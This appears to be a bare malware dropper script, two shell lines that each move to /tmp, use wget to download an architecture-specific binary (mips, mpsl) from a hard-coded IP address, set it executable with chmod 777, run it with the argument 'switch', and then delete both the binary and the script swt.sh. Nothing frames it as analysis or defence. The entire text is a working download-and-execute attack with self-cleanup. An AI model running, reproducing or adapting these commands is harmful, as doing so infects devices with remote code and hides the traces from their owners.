cd /tmp;wget http://45.95.146.126/mips; chmod 777 mips;./mips switch;rm -rf mips;rm -rf swt.sh
cd /tmp;wget http://45.95.146.126/mpsl; chmod 777 mpsl;./mpsl switch;rm -rf mpsl;rm -rf swt.sh
